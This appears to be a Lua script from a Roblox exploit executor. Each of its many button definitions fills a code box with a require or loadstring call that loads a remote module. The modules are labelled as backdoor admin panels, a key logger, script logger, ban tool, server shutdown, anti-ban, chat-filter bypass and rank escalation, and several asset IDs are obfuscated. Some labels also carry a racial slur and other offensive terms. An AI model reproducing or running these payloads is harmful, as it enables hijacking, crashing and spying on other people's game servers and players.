AddScriptBtn(requiresList, "projectligma", function() codeInput.Text = 'loadstring(require(15163689230).projectligma(""))()' end)
AddScriptBtn(requiresList, "unknown 823", function() codeInput.Text = 'loadstring(require(10027382472)("luvssforfabi"))()' end)
AddScriptBtn(requiresList, "unknown 911", function() codeInput.Text = 'loadstring(require(6896725229).ok("Gabrieltestudo"))()' end)
AddScriptBtn(requiresList, "sylix", function() codeInput.Text = 'loadstring(require(139827669429576).sylix("MAULANA_RAMDHA"))()' end)
AddScriptBtn(requiresList, "unknown 554", function() codeInput.Text = 'loadstring(require(11983144110))()' end)
AddScriptBtn(requiresList, "private executor", function() codeInput.Text = 'loadstring(require(9896417368).load("username"))()' end)
AddScriptBtn(requiresList, "project ligma", function() codeInput.Text = 'loadstring(require(12152005848)("username"))()' end)
AddScriptBtn(requiresList, "zetra79", function() codeInput.Text = 'loadstring(require(11988216523).load("username"))()' end)
AddScriptBtn(requiresList, "rc7", function() codeInput.Text = 'loadstring(require(12491997136)("fluxusguy1234"))()' end)
AddScriptBtn(requiresList, "sugma / stigma edit", function() codeInput.Text = 'loadstring(require(13641624112):tus("username"))()' end)
AddScriptBtn(requiresList, "tubers93 gui", function() codeInput.Text = 'loadstring(require(13326771513).TUBERSGUI("username"))()' end)
AddScriptBtn(requiresList, "k00padmin", function() codeInput.Text = 'loadstring(require(11940052675).load("username"))()' end)
AddScriptBtn(requiresList, "anonymous gui", function() codeInput.Text = 'loadstring(require(10028265342)("username"))()' end)
AddScriptBtn(requiresList, "edited bytegui", function() codeInput.Text = 'loadstring(require(11983144110)("username"))()' end)
AddScriptBtn(requiresList, "verified exser edit", function() codeInput.Text = 'loadstring(require(12897516284):pls("username"))()' end)
AddScriptBtn(requiresList, "ANOTHER ONE", function() codeInput.Text = 'loadstring(require(13718034160):pls("LuaGunsX"))()' end)
AddScriptBtn(requiresList, "display hub", function() codeInput.Text = 'loadstring(require(11504840911).load("username"))()' end)
AddScriptBtn(requiresList, "adren gui", function() codeInput.Text = 'loadstring(require(11721506491)("username"))()' end)
AddScriptBtn(requiresList, "c00lgui edit v2", function() codeInput.Text = 'loadstring(require(9036221508).load("username"))()' end)
AddScriptBtn(requiresList, "another bytegui edit ig?", function() codeInput.Text = 'loadstring(require(9497518303).BYTEGUIKYXLES("username"))()' end)
AddScriptBtn(requiresList, "k00pgui revamp", function() codeInput.Text = 'loadstring(require(11611459969).load("username"))()' end)
AddScriptBtn(requiresList, "secret hub", function() codeInput.Text = 'loadstring(require(13021554242).Cl00vin("username"))()' end)
AddScriptBtn(requiresList, "c00lboi admin", function() codeInput.Text = 'loadstring(require(13045816634)("username"))()' end)
AddScriptBtn(requiresList, "backdoor k00pgui", function() codeInput.Text = 'loadstring(require(13464268783).k00pzbackdoor("username"))()' end)
AddScriptBtn(requiresList, "Dragostar v5", function() codeInput.Text = 'loadstring(require(16528756174).epic("this gui is working"))()' end)
AddScriptBtn(requiresList, "unknown 104", function() codeInput.Text = 'loadstring(require(0x391c103dd).load("user"))()' end)
AddScriptBtn(requiresList, "unknown 662", function() codeInput.Text = 'loadstring(require(9812006079):Immortal("user"))()' end)
AddScriptBtn(requiresList, "item_asylum", function() codeInput.Text = 'loadstring(require(13944915491).item_asylum("user"))()' end)
AddScriptBtn(requiresList, "unknown 991", function() codeInput.Text = 'loadstring(require(15622251265).ttkdd("username"))()' end)
AddScriptBtn(requiresList, "unknown 305", function() codeInput.Text = 'loadstring(require(9635947635).load("username"))()' end)
AddScriptBtn(requiresList, "synapse", function() codeInput.Text = 'loadstring(require(83985610570355).synapse("G00bydølan_6664"))()' end)
AddScriptBtn(requiresList, "sx", function() codeInput.Text = 'loadstring(require(105488601785715).sx("G0@bydolan_6664"))()' end)
AddScriptBtn(requiresList, "unknown 887", function() codeInput.Text = 'loadstring(require(16920033857)("USERNAME"))()' end)
AddScriptBtn(requiresList, "unknown 119", function() codeInput.Text = 'loadstring(require(97550426088078)("username", "LigmaMiniHub"))()' end)
AddScriptBtn(requiresList, "FREE", function() codeInput.Text = 'loadstring(require(16343710413).FREE("user"))()' end)
AddScriptBtn(requiresList, "RC7Blue", function() codeInput.Text = 'loadstring(require(-0x1be1d4a9c5*0x95+0x8048d06c93c9+-0x4eaf*0x4e5127b3):RC7Blue("XX_GraysonBuilderCir"))()' end)
AddScriptBtn(requiresList, "Dryq74gui", function() codeInput.Text = 'loadstring(require(134839673375508).Dryq74gui("user"))()' end)
AddScriptBtn(requiresList, "DreamGUI", function() codeInput.Text = 'loadstring(require(15232587754).DreamGUI("Username"))()' end)
AddScriptBtn(requiresList, "brineteam", function() codeInput.Text = 'loadstring(require(90214918366880):brineteam("your name"))()' end)
AddScriptBtn(requiresList, "DariusSiSupramSkid", function() codeInput.Text = 'loadstring(require(17131051292).DariusSiSupramSkid(""))()' end)
AddScriptBtn(requiresList, "euphoria", function() codeInput.Text = 'loadstring(require(96844128852058).euphoria("XX_GraysonBuilderCir"))()' end)
AddScriptBtn(requiresList, "V5", function() codeInput.Text = 'loadstring(require(0x4760C3485305).V5("username"))()' end)
AddScriptBtn(requiresList, "SS", function() codeInput.Text = 'loadstring(require(92459500856187).SS("name"))()' end)
AddScriptBtn(requiresList, "unknown 448", function() codeInput.Text = 'loadstring(require(134907549394378)("tubers930s_270"))()' end)
AddScriptBtn(requiresList, "pepsi", function() codeInput.Text = 'loadstring(require(113825094179678).pepsi("yourlifeleessname"))()' end)
AddScriptBtn(requiresList, "kr00n", function() codeInput.Text = 'loadstring(require(12962622046).kr00n("user"))()' end)
AddScriptBtn(requiresList, "unknown 152", function() codeInput.Text = 'loadstring(require(83282700079414).load("ahsduy"))()' end)
AddScriptBtn(requiresList, "coolgui", function() codeInput.Text = 'loadstring(require(97727020165526).coolgui("Aleks87868"))()' end)
AddScriptBtn(requiresList, "LGBT", function() codeInput.Text = 'loadstring(require(128212093523664).LGBT("ass"))()' end)
AddScriptBtn(requiresList, "l0ckk1dd", function() codeInput.Text = 'loadstring(require(12400294214).l0ckk1dd(game.Players.LocalPlayer.Name))()' end)
AddScriptBtn(requiresList, "Lol", function() codeInput.Text = 'loadstring(require(13384321204):Lol(game.Players.LocalPlayer.Name))()' end)
AddScriptBtn(requiresList, "unknown 603", function() codeInput.Text = 'loadstring(require(12083153332).load(game.Players.LocalPlayer.Name))()' end)
AddScriptBtn(requiresList, "j01tar0v11", function() codeInput.Text = 'loadstring(require(0x3bfa6f415):j01tar0v11(game.Players.LocalPlayer.Name))()' end)
AddScriptBtn(requiresList, "gui", function() codeInput.Text = 'loadstring(require(13982321446).gui(game.Players.LocalPlayer.Name))()' end)
AddScriptBtn(requiresList, "unknown 958", function() codeInput.Text = 'loadstring(require(15489042466).xDDDDDDDDDdjgyrottazaojumpstyle2009stylerzcoolbeatvaleriabounzetagsLOLLLLLSp1R1t0Xhardjumpjypsyletrollface("user"))()' end)
AddScriptBtn(requiresList, "v6yessirhahaskid", function() codeInput.Text = 'loadstring(require(14625944908).v6yessirhahaskid(game.Players.LocalPlayer.Name))()' end)
AddScriptBtn(requiresList, "sdd", function() codeInput.Text = 'loadstring(require(13120847367).sdd("toombors97"))()' end)
AddScriptBtn(requiresList, "SentinelPrime", function() codeInput.Text = 'loadstring(require(109690586705177).SentinelPrime("toombors97"))()' end)
AddScriptBtn(requiresList, "Brickma", function() codeInput.Text = 'loadstring(require(112945327108627).Brickma("toombors97"))()' end)
AddScriptBtn(requiresList, "unknown 590", function() codeInput.Text = 'loadstring(require(6896725229).ok("toombors97"))()' end)
AddScriptBtn(requiresList, "name", function() codeInput.Text = 'loadstring(require(140598895316451).name("toombors97"))()' end)
AddScriptBtn(requiresList, "EDILOL", function() codeInput.Text = 'loadstring(require(114344318563388).EDILOL("toombors97"))()' end)
AddScriptBtn(requiresList, "SS (toombors)", function() codeInput.Text = 'loadstring(require(92459500856187).SS("toombors97"))()' end)
AddScriptBtn(requiresList, "projectligma (toombors)", function() codeInput.Text = 'loadstring(require(15163689230).projectligma("toombors97"))()' end)
AddScriptBtn(requiresList, "Pload", function() codeInput.Text = 'loadstring(require(88477009909590):Pload("toombors97"))()' end)
AddScriptBtn(requiresList, "Polaria", function() codeInput.Text = 'require(123255432303221):Pload("user")' end)
AddScriptBtn(requiresList, "Secret Service Panel", function() codeInput.Text = 'require(17073274775)("pfzq")' end)
AddScriptBtn(requiresList, "Secret Service Panel DEX Version", function() codeInput.Text = 'require(16977144399)("pfzq")' end)
AddScriptBtn(requiresList, "Secret Service Administration", function() codeInput.Text = 'require(16668858335).skid("pfzq","ssa")' end)
AddScriptBtn(requiresList, "Old Secret Service Administration", function() codeInput.Text = 'require(16668984909).load("pfzq","1994 days on roblox")' end)
AddScriptBtn(requiresList, "Old Secret Service Panel", function() codeInput.Text = 'require(17632411730){Owners={"pfzq"},Prefix=\';\'}' end)
AddScriptBtn(requiresList, "Obunga", function() codeInput.Text = 'require(97971729290214)()' end)
AddScriptBtn(requiresList, "Obuga Citizen One", function() codeInput.Text = 'require(123134147078298)()' end)
AddScriptBtn(requiresList, "DreamyBull Gui , By Hamad", function() codeInput.Text = 'require(18790530478)("pfzq")' end)
AddScriptBtn(requiresList, "infinitie yield", function() codeInput.Text = 'require(7634392335)("pfzq")' end)
AddScriptBtn(requiresList, "Fbi executor", function() codeInput.Text = 'require(18178393297)("pfzq")' end)
AddScriptBtn(requiresList, "SS v2 So Cool", function() codeInput.Text = 'require(6405516751).load("RobloxBoy4762")' end)
AddScriptBtn(requiresList, "primadon", function() codeInput.Text = 'require(17513697824)("Username")' end)
AddScriptBtn(requiresList, "AOS Admin", function() codeInput.Text = 'require(16661955141):Fire("pfzq")' end)
AddScriptBtn(requiresList, "ur bads AOS Admin", function() codeInput.Text = 'require(16771067578):Fire("pfzq")' end)
AddScriptBtn(requiresList, "Mr Bean admin", function() codeInput.Text = 'require(16638501761){Owners={"pfzq"},Prefix=\';\'}' end)
AddScriptBtn(requiresList, "Mcdonalds Admin", function() codeInput.Text = 'require(16668583391){Owners={"pfzq"},Prefix=\';\'}' end)
AddScriptBtn(requiresList, "Strato admin", function() codeInput.Text = 'require(6590963180).load("pfzq")' end)
AddScriptBtn(requiresList, "V3rmillion Admin", function() codeInput.Text = 'require(16991153209).load("pfzq")' end)
AddScriptBtn(requiresList, "MML Admin", function() codeInput.Text = 'require(7573703059).MMLHax("pfzq")' end)
AddScriptBtn(requiresList, "Fe hax", function() codeInput.Text = 'require(17472456139).fehax("yourname")' end)
AddScriptBtn(requiresList, "Nexus Admin", function() codeInput.Text = 'require(16988699893)("pfzq")' end)
AddScriptBtn(requiresList, "Bee Exoliner admin V2", function() codeInput.Text = 'require(2969225161):Fire("Nob","pfzq")' end)
AddScriptBtn(requiresList, "Intent Admin", function() codeInput.Text = 'require(16988255787):Fire("Intent","pfzq")' end)
AddScriptBtn(requiresList, "Frank\'s Admin", function() codeInput.Text = 'require(16988244323):FranksAdmin("Frank","pfzq")' end)
AddScriptBtn(requiresList, "Infyield Admin", function() codeInput.Text = 'require(4832971989)("RobloxBoy4762")' end)
AddScriptBtn(requiresList, "Moon\'s Infyield Admin", function() codeInput.Text = 'require(16988709094)("pfzq")' end)
AddScriptBtn(requiresList, "Cooks Infyield Admin", function() codeInput.Text = 'require(16662939551)("pfzq")' end)
AddScriptBtn(requiresList, "Adonis Admin", function() codeInput.Text = 'require(16662768931):GetAdmin("pfzq","Hi??")' end)
AddScriptBtn(requiresList, "Quantom Admin", function() codeInput.Text = 'require(3048207279):Fire("kermitwashere,ok","pfzq")' end)
AddScriptBtn(requiresList, "Rocky2U Admin", function() codeInput.Text = 'require(16662837893).AddRocky("pfzq")' end)
AddScriptBtn(requiresList, "Bilbert SS", function() codeInput.Text = 'require(16988766924)("pfzq")' end)
AddScriptBtn(requiresList, "Loaf Ss", function() codeInput.Text = 'require(6405516751).load("pfzq")' end)
AddScriptBtn(requiresList, "Doot Ss", function() codeInput.Text = 'require(16662883722).hii("pfzq")' end)
AddScriptBtn(requiresList, "Sigma Ss", function() codeInput.Text = 'require(4982992957):Fire("pfzq")' end)
AddScriptBtn(requiresList, "Herobrine", function() codeInput.Text = 'require(17601661042)("pfzq")' end)
AddScriptBtn(requiresList, "NI-CISYNIA", function() codeInput.Text = 'require(7324976391).load("pfzq")' end)
AddScriptBtn(requiresList, "Cloud", function() codeInput.Text = 'require(5665978099)("pfzq")' end)
AddScriptBtn(requiresList, "Morph Magic GUI", function() codeInput.Text = 'require(4941950065)("pfzq")' end)
AddScriptBtn(requiresList, "Sugma V1 GUI", function() codeInput.Text = 'require(16669178176)("pfzq")' end)
AddScriptBtn(requiresList, "Manuall Hax GUI", function() codeInput.Text = 'require(6712240276).yo("pfzq")' end)
AddScriptBtn(requiresList, "Gosh GUI", function() codeInput.Text = 'require(16668835270).load("pfzq")' end)
AddScriptBtn(requiresList, "PLUR GUI", function() codeInput.Text = 'require(6280142988).Purl("pfzq")' end)
AddScriptBtn(requiresList, "Ark Of Hades GUI", function() codeInput.Text = 'require(16988738909)("pfzq")' end)
AddScriptBtn(requiresList, "Rocket GUI", function() codeInput.Text = 'require(2513295250).load("pfzq")' end)
AddScriptBtn(requiresList, "SS GUI", function() codeInput.Text = 'require(2937437253).load("pfzq")' end)
AddScriptBtn(requiresList, "UVG GUI", function() codeInput.Text = 'require(6280136701).load("pfzq")' end)
AddScriptBtn(requiresList, "JuanaV3 GUI", function() codeInput.Text = 'require(4924065675):Fire("pfzq")' end)
AddScriptBtn(requiresList, "C00lKidd GUI", function() codeInput.Text = 'require(16991244705):Fire("pfzq","c00lkidd")' end)
AddScriptBtn(requiresList, "Bee\'s SS GUI", function() codeInput.Text = 'require(2670071430).load("pfzq")' end)
AddScriptBtn(requiresList, "Dex ultimate Debugging Suite", function() codeInput.Text = 'require(16662779782)("pfzq")' end)
AddScriptBtn(requiresList, "Classic GUI", function() codeInput.Text = 'require(2930633918).load("pfzq")' end)
AddScriptBtn(requiresList, "Nilzer V5 GUI", function() codeInput.Text = 'require(7054827484).load("pfzq")' end)
AddScriptBtn(requiresList, "Utgv1 Abusive guns GUI", function() codeInput.Text = 'require(6447503730)("pfzq")' end)
AddScriptBtn(requiresList, "Gun GUI", function() codeInput.Text = 'require(16662820067)("pfzq","BEANMANBEANMAN")' end)
AddScriptBtn(requiresList, "Tubers93 Gun GUI", function() codeInput.Text = 'require(6677765693)("pfzq","welovedooter")' end)
AddScriptBtn(requiresList, "Stummy and Watheck Gun GUI", function() codeInput.Text = 'require(16662919029)("pfzq","how")' end)
AddScriptBtn(requiresList, "best hub", function() codeInput.Text = 'require(4634558715)("pfzq")' end)
AddScriptBtn(requiresList, "BuilderX Hub", function() codeInput.Text = 'require(16668530286).BX("pfzq")' end)
AddScriptBtn(requiresList, "Topkek V5.2", function() codeInput.Text = 'require(10127180199)("pfzq")' end)
AddScriptBtn(requiresList, "Topkek V5", function() codeInput.Text = 'require(6449959779)("pfzq")' end)
AddScriptBtn(requiresList, "Topkek V4", function() codeInput.Text = 'require(4253460888).die("pfzq")' end)
AddScriptBtn(requiresList, "Dex", function() codeInput.Text = 'require(2701572481):Fire("pfzq")' end)
AddScriptBtn(requiresList, "Developer Console 2.0", function() codeInput.Text = 'require(16668841976).load("pfzq")' end)
AddScriptBtn(requiresList, "Bee\'s Dex", function() codeInput.Text = 'require(2919395703).load("pfzq")' end)
AddScriptBtn(requiresList, "Chathax", function() codeInput.Text = 'require(2942451291):Yee("pfzq")' end)
AddScriptBtn(requiresList, "Project ligma 2", function() codeInput.Text = 'require(6595545318)("pfzq")' end)
AddScriptBtn(requiresList, "Key Logger", function() codeInput.Text = 'require(7098251271)("pfzq")' end)
AddScriptBtn(requiresList, "hark V2", function() codeInput.Text = 'require(4770241281):hark("pfzq")' end)
AddScriptBtn(requiresList, "Hat remover", function() codeInput.Text = 'require(3052589161).load("pfzq")' end)
AddScriptBtn(requiresList, "Ro Exploit v6", function() codeInput.Text = 'require(4159766103).load("pfzq")' end)
AddScriptBtn(requiresList, "Ro-Exploit v7", function() codeInput.Text = 'require(6822778802)("pfzq")' end)
AddScriptBtn(requiresList, "Launcher", function() codeInput.Text = 'require(4878995989)("pfzq")' end)
AddScriptBtn(requiresList, "Noot-Noot", function() codeInput.Text = 'require(2113801730).load("pfzq")' end)
AddScriptBtn(requiresList, "Chat Bypass", function() codeInput.Text = 'require(16991207514)()' end)
AddScriptBtn(requiresList, "Love Communism", function() codeInput.Text = 'require(881919150)()' end)
AddScriptBtn(requiresList, "Script Logger", function() codeInput.Text = 'require(5098133040):FirePire("pfzq:Pire")' end)
AddScriptBtn(requiresList, "Chat GUI", function() codeInput.Text = 'require(16662775615)("pfzq")' end)
AddScriptBtn(requiresList, "Ban Remote", function() codeInput.Text = 'require(6244072289).load("pfzq")' end)
AddScriptBtn(requiresList, "Jumpscare", function() codeInput.Text = 'require(17107085030).jumpscare("Players name here")' end)
AddScriptBtn(requiresList, "Teletubbies Jumpscare", function() codeInput.Text = 'require(17118822859).gui()' end)
AddScriptBtn(requiresList, "Jeff the Kiler Jumpscare", function() codeInput.Text = 'require(17118930276).gui()' end)
AddScriptBtn(requiresList, "Antiban", function() codeInput.Text = 'require(2788315378).load("pfzq")' end)
AddScriptBtn(requiresList, "new project stigma watermark", function() codeInput.Text = 'require(16662947197).lol("pfzq")' end)
AddScriptBtn(requiresList, "Crossmod Ya", function() codeInput.Text = 'require(4294379983)("pfzq")' end)
AddScriptBtn(requiresList, "Shutdown", function() codeInput.Text = 'require(2982093974):Shutdown()' end)
AddScriptBtn(requiresList, "Kohls Rank Owner", function() codeInput.Text = '_G.setPower:Fire("pfzq", 6)' end)
AddScriptBtn(requiresList, "Nepaha", function() codeInput.Text = 'require(4942359996):nepaha(5127063380,1,3)' end)
AddScriptBtn(requiresList, "hark stamper", function() codeInput.Text = 'require(13214021276).stamper(game:GetService("Players").LocalPlayer)' end)
AddScriptBtn(requiresList, "tool stamper", function() codeInput.Text = 'require(17015419876)("pfzq")' end)
AddScriptBtn(requiresList, "Stamper tool 2", function() codeInput.Text = 'require(17107064578)("pfzq")' end)
AddScriptBtn(requiresList, "Converted Btools", function() codeInput.Text = 'require(16530393933)("pfzq")' end)
AddScriptBtn(requiresList, "Teddy Trap", function() codeInput.Text = 'require(6291736680)("pfzq")' end)
AddScriptBtn(requiresList, "Whispy Woods", function() codeInput.Text = 'require(17072075353)("pfzq")' end)
AddScriptBtn(requiresList, "WTRB", function() codeInput.Text = 'require(17073309179).asd()' end)
AddScriptBtn(requiresList, "Devoyance V4", function() codeInput.Text = 'require(17015453713)("pfzq")' end)
AddScriptBtn(requiresList, "Star Glitcher", function() codeInput.Text = 'require(17110304506):Fire("pfzq")' end)
AddScriptBtn(requiresList, "Knife Murderer", function() codeInput.Text = 'require(17000621196)("pfzq")' end)
AddScriptBtn(requiresList, "VR Hands V2", function() codeInput.Text = 'require(16991174162).LoadHands("pfzq")' end)
AddScriptBtn(requiresList, "VR Hands", function() codeInput.Text = 'require(16991188827).LoadHands("pfzq")' end)
AddScriptBtn(requiresList, "bus", function() codeInput.Text = 'require(16494104046)("pfzq")' end)
AddScriptBtn(requiresList, "old bus", function() codeInput.Text = 'require(4302281183)("pfzq")' end)
AddScriptBtn(requiresList, "steve", function() codeInput.Text = 'require(16756009191).mc("pfzq")' end)
AddScriptBtn(requiresList, "Arc of mystics", function() codeInput.Text = 'require(16571960080)("pfzq")' end)
AddScriptBtn(requiresList, "bulldozer", function() codeInput.Text = 'require(16571914488)("pfzq")' end)
AddScriptBtn(requiresList, "Primadon Modules", function() codeInput.Text = 'require(15851028325)("pfzq")' end)
AddScriptBtn(requiresList, "Grandosla", function() codeInput.Text = 'require(16492539574)("pfzq")' end)
AddScriptBtn(requiresList, "Trainset", function() codeInput.Text = 'require(15708038439)("pfzq")' end)
AddScriptBtn(requiresList, "Dimensiona Glitcher", function() codeInput.Text = 'require(6058166660)("pfzq")' end)
AddScriptBtn(requiresList, "Boat", function() codeInput.Text = 'require(4118900723)("pfzq")' end)
AddScriptBtn(requiresList, "Catholic Mario", function() codeInput.Text = 'require(2936927437).load("pfzq")' end)
AddScriptBtn(requiresList, "Asgpro", function() codeInput.Text = 'require(7861620568).load("pfzq")' end)
AddScriptBtn(requiresList, "Mustard Gas", function() codeInput.Text = 'require(16668612817).load("pfzq")' end)
AddScriptBtn(requiresList, "Camera Chat Viewer", function() codeInput.Text = 'require(16668701301)("pfzq")' end)
AddScriptBtn(requiresList, "SCP 173", function() codeInput.Text = 'require(17234454946).load("pfzq")' end)
AddScriptBtn(requiresList, "Venti", function() codeInput.Text = 'require(16991146409)("pfzq")' end)
AddScriptBtn(requiresList, "dong 1", function() codeInput.Text = 'require(16662786555).load("pfzq")' end)
AddScriptBtn(requiresList, "Rufus FB Beryl Gun", function() codeInput.Text = 'require(7632927778).Gunnis("pfzq")' end)
AddScriptBtn(requiresList, "Remington 870", function() codeInput.Text = 'require(4879817593)("pfzq")' end)
AddScriptBtn(requiresList, "Baby Thrower", function() codeInput.Text = 'require(16991251417)("pfzq")' end)
AddScriptBtn(requiresList, "Big tornado", function() codeInput.Text = 'require(2938226981).load("pfzq")' end)
AddScriptBtn(requiresList, "Money Bags", function() codeInput.Text = 'require(8712553243).load("pfzq")' end)
AddScriptBtn(requiresList, "DOGE Summoner", function() codeInput.Text = 'require(16662812199).fehack("pfzq")' end)
AddScriptBtn(requiresList, "Hark Guns", function() codeInput.Text = 'require(6930300577)("pfzq")' end)
AddScriptBtn(requiresList, "Mr Bean Decals", function() codeInput.Text = 'require(16668594829).map()' end)
AddScriptBtn(requiresList, "Snake", function() codeInput.Text = 'require(10504523281)("pfzq")' end)
AddScriptBtn(requiresList, "Mario Decals", function() codeInput.Text = 'require(16991126811)("pfzq")' end)
AddScriptBtn(requiresList, "Flamethrower", function() codeInput.Text = 'require(9306185951).load("pfzq")' end)
AddScriptBtn(requiresList, "Koolaid Sizer", function() codeInput.Text = 'require(7695034125).load("Koolaid", "pfzq")' end)
AddScriptBtn(requiresList, "RockNRoll", function() codeInput.Text = 'require(9306045365).load()' end)
AddScriptBtn(requiresList, "CSGO Guns", function() codeInput.Text = 'require(4207271766).load("pfzq")' end)
AddScriptBtn(requiresList, "Dababy mobile", function() codeInput.Text = 'require(6604157329).dababymobile("pfzq")' end)
AddScriptBtn(requiresList, "Jihad", function() codeInput.Text = 'require(2971552917).load("pfzq")' end)
AddScriptBtn(requiresList, "Guns", function() codeInput.Text = 'require(2823974237).giveGuns(\'pfzq\')' end)
AddScriptBtn(requiresList, "Other Guns", function() codeInput.Text = 'require(16668739839).load("pfzq")' end)
AddScriptBtn(requiresList, "Volcanic Inc Guns", function() codeInput.Text = 'require(16668929184).load("pfzq","asd")' end)
AddScriptBtn(requiresList, "Red imposter", function() codeInput.Text = 'require(9307026189).load("pfzq")' end)
AddScriptBtn(requiresList, "Drip goku", function() codeInput.Text = 'require(6331324671).load("pfzq")' end)
AddScriptBtn(requiresList, "dream", function() codeInput.Text = 'require(6590634930).load("pfzq")' end)
AddScriptBtn(requiresList, "Pee", function() codeInput.Text = 'require(4709753802).load("pfzq")' end)
AddScriptBtn(requiresList, "AR-15", function() codeInput.Text = 'require(16662828437).naenae("pfzq")' end)
AddScriptBtn(requiresList, "dong 2", function() codeInput.Text = 'require(2979543081).load(\'Dong\', \'pfzq\')' end)
AddScriptBtn(requiresList, "Catalog Items", function() codeInput.Text = 'require(16668556009).items("pfzq")' end)
AddScriptBtn(requiresList, "R6 Module", function() codeInput.Text = 'require(9635947635).load("pfzq")' end)
AddScriptBtn(requiresList, "Stummy\'s R6", function() codeInput.Text = 'require(16669109277):albert("pfzq")' end)
AddScriptBtn(requiresList, "Worship", function() codeInput.Text = 'require(9423212339).lol()' end)
AddScriptBtn(requiresList, "Grab Knife V1", function() codeInput.Text = 'require(16662794620):Fire("pfzq","knife")' end)
AddScriptBtn(requiresList, "Grab Knife V2", function() codeInput.Text = 'require(16662799266):Fire("pfzq","knife")' end)
AddScriptBtn(requiresList, "Grab Knife V3", function() codeInput.Text = 'require(2699238418):Fire("pfzq")' end)
AddScriptBtn(requiresList, "Grab Knife V4", function() codeInput.Text = 'require(16662802057).load("pfzq")' end)
AddScriptBtn(requiresList, "Dev Uzi", function() codeInput.Text = 'require(16662808456):Fire("pfzq","dev-uzi")' end)
AddScriptBtn(requiresList, "Bird Wings", function() codeInput.Text = 'require(16668712615):Fire("pfzq","birdwings")' end)
AddScriptBtn(requiresList, "F3X", function() codeInput.Text = 'require(16662897769).load("pfzq")' end)
AddScriptBtn(requiresList, "SubStrike", function() codeInput.Text = 'require(14775634069)("pfzq")' end)
AddScriptBtn(requiresList, "Holiday Feel", function() codeInput.Text = 'require(4502358827).load("pfzq")' end)
AddScriptBtn(requiresList, "ASG Glitcher", function() codeInput.Text = 'require(4721760220):yes("pfzq")' end)
AddScriptBtn(requiresList, "Auerus Sword", function() codeInput.Text = 'require(5428886940)(\'pfzq\')' end)
AddScriptBtn(requiresList, "lightborn", function() codeInput.Text = 'require(16639115097)("pfzq")' end)
AddScriptBtn(requiresList, "S400 Missile Airstrike", function() codeInput.Text = 'require(10791446752).s400("pfzq")' end)
AddScriptBtn(requiresList, "RC7 Cloud", function() codeInput.Text = 'require(16668626906).load("pfzq")' end)
AddScriptBtn(requiresList, "Nightmare", function() codeInput.Text = 'require(5540630099).load("Night", "pfzq")' end)
AddScriptBtn(requiresList, "Some nigga flying", function() codeInput.Text = 'require(9353485888).smokio("pfzq")' end)
AddScriptBtn(requiresList, "Agent Gears", function() codeInput.Text = 'require(16668718607):Start("pfzq","AAA")' end)
AddScriptBtn(requiresList, "Nuclear Missile", function() codeInput.Text = 'require(7804327506).amigodogodenot123("pfzq")' end)
AddScriptBtn(requiresList, "QuadDoom", function() codeInput.Text = 'require(5987029970)("Quad", "pfzq")' end)
AddScriptBtn(requiresList, "Mech Helkren", function() codeInput.Text = 'require(5987029970)("mechv3", "pfzq")' end)
AddScriptBtn(requiresList, "sledgehammer", function() codeInput.Text = 'require(8038037940).CLoad("pfzq")' end)
AddScriptBtn(requiresList, "Random Sniper", function() codeInput.Text = 'require(6141052467).load("pfzq")' end)
AddScriptBtn(requiresList, "Reaper Apocalypse Gun", function() codeInput.Text = 'require(9439511627).load("pfzq")' end)
AddScriptBtn(requiresList, "Hark", function() codeInput.Text = 'require(16661967932).load()' end)
AddScriptBtn(requiresList, "Mareno", function() codeInput.Text = 'require(5617162803)("mareno", "pfzq")' end)
AddScriptBtn(requiresList, "Sonic", function() codeInput.Text = 'require(16668806562).you("pfzq")' end)
AddScriptBtn(requiresList, "Xester Module", function() codeInput.Text = 'require(2918747265).load("pfzq")' end)
AddScriptBtn(requiresList, "Guitar Vizualiser", function() codeInput.Text = 'require(6494016015).ez("pfzq")' end)
AddScriptBtn(requiresList, "Electric Gun", function() codeInput.Text = 'require(6494159046).load("pfzq")' end)
AddScriptBtn(requiresList, "Star Glitcher 1.0", function() codeInput.Text = 'require(9442292486).load("pfzq")' end)
AddScriptBtn(requiresList, "Star Glitcher 2.0", function() codeInput.Text = 'require(4749896781).no("pfzq")' end)
AddScriptBtn(requiresList, "Project Reaper", function() codeInput.Text = 'require(6494001763).load("pfzq")' end)
AddScriptBtn(requiresList, "Virus", function() codeInput.Text = 'require(16661962908).load("pfzq")' end)
AddScriptBtn(requiresList, "Internal War", function() codeInput.Text = 'require(9359921623).load("pfzq")' end)
AddScriptBtn(requiresList, "Infection Virus", function() codeInput.Text = 'require(8317917339).Infection("pfzq")' end)
AddScriptBtn(requiresList, "Tesseract", function() codeInput.Text = 'require(4611972434).load("pfzq")' end)
AddScriptBtn(requiresList, "Dual Ultima", function() codeInput.Text = 'require(9439014627).load("pfzq")' end)
AddScriptBtn(requiresList, "Jarred Ultra Mech", function() codeInput.Text = 'require(9408190487).load("pfzq")' end)
AddScriptBtn(requiresList, "Orb titan", function() codeInput.Text = 'require(9438952843).load("pfzq")' end)
AddScriptBtn(requiresList, "Sociopath", function() codeInput.Text = 'require(4611999946).load("pfzq")' end)
AddScriptBtn(requiresList, "SpiderMan With Gun", function() codeInput.Text = 'require(5044313504).load("pfzq")' end)
AddScriptBtn(requiresList, "Shotgun Module 1", function() codeInput.Text = 'require(6230507140).load("pfzq")' end)
AddScriptBtn(requiresList, "Neurotic", function() codeInput.Text = 'require(5617600468).load("pfzq")' end)
AddScriptBtn(requiresList, "Charlie Chaptin", function() codeInput.Text = 'require(6606289064).load("pfzq")' end)
AddScriptBtn(requiresList, "Gattai Zamasu", function() codeInput.Text = 'require(6424791174).load("pfzq")' end)
AddScriptBtn(requiresList, "SHINI-G4-MI", function() codeInput.Text = 'require(4661785318).load("pfzq")' end)
AddScriptBtn(requiresList, "Vereus", function() codeInput.Text = 'require(4875169740).load("pfzq")' end)
AddScriptBtn(requiresList, "Goku", function() codeInput.Text = 'require(7433042949)("pfzq")' end)
AddScriptBtn(requiresList, "USSR Helicopter", function() codeInput.Text = 'require(5861768566).import()' end)
AddScriptBtn(requiresList, "Kill Machine", function() codeInput.Text = 'require(6375409514).load("pfzq")' end)
AddScriptBtn(requiresList, "TeaPot", function() codeInput.Text = 'require(5982007129).load("pfzq")' end)
AddScriptBtn(requiresList, "Dark Wings", function() codeInput.Text = 'require(9439278540).load("pfzq")' end)
AddScriptBtn(requiresList, "Music Box", function() codeInput.Text = "require(0x1111c26b0)['eliza']('pfzq');" end)
AddScriptBtn(requiresList, "Goner", function() codeInput.Text = 'require(4513235536).G("pfzq")' end)
AddScriptBtn(requiresList, "Swords", function() codeInput.Text = 'require(6215755057).load("pfzq")' end)
AddScriptBtn(requiresList, "rocket sword of old", function() codeInput.Text = 'require(6496754050).load("pfzq")' end)
